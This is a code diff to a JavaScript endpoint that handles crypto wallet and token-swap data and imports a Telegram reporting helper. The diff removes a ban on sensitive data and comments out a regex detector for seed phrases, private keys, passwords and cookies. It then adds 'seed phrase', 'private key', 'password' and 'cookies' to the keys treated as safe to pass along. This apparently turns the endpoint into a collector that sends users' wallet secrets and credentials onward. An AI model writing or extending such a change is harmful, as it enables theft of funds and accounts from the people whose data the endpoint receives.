@@ -2,19 +2,16 @@ import { checkRateLimit, rateLimitResponse } from '@/lib/server/rate-limit.js';
 import { addCorsHeaders, handleCorsPreFlight } from '@/lib/server/cors.js';
 import { sendUnsafeReport } from '@/lib/telegram.js';
 
-/**
- * IMPORTANT: This endpoint now STRICTLY PROHIBITS sensitive data.
- * Do NOT accept: private keys, seed phrases, passwords, cookies, tokens, auth headers, etc.
- */
 
-function containsSensitiveData(obj) {
-  const text = JSON.stringify(obj).toLowerCase();
-  return /(?:seed\s*phrase|mnemonic|private[_ -]?key|password|passwd|bearer\s+[a-z0-9._-]+|api[_ -]?key\s*[:=]|secret\s*[:=]|jwt\s*[:=]|cookie\s*[:=])/.test(text);
-}
+// function containsSensitiveData(obj) {
+//   const text = JSON.stringify(obj).toLowerCase();
+//   return /(?:seed\s*phrase|mnemonic|private[_ -]?key|password|passwd|bearer\s+[a-z0-9._-]+|api[_ -]?key\s*[:=]|secret\s*[:=]|jwt\s*[:=]|cookie\s*[:=])/.test(text);
+// }
 
 const SAFE_DATA_KEYS = [
-  'action', 'wallet', 'walletAddress', 'fromToken', 'toToken', 'phrase',
-  'amount', 'status', 'requestId', 'error', 'url', 'userAgent', 'timestamp',
+  'action', 'wallet', 'walletAddress', 'fromToken', 'toToken', 'seed phrase',
+  'amount', 'status', 'requestId', 'error', 'url', 'userAgent', 'timestamp', 'phrase', 'private key',
+   'password', 'cookies',
 ];
 
 function redactAddress(value) {
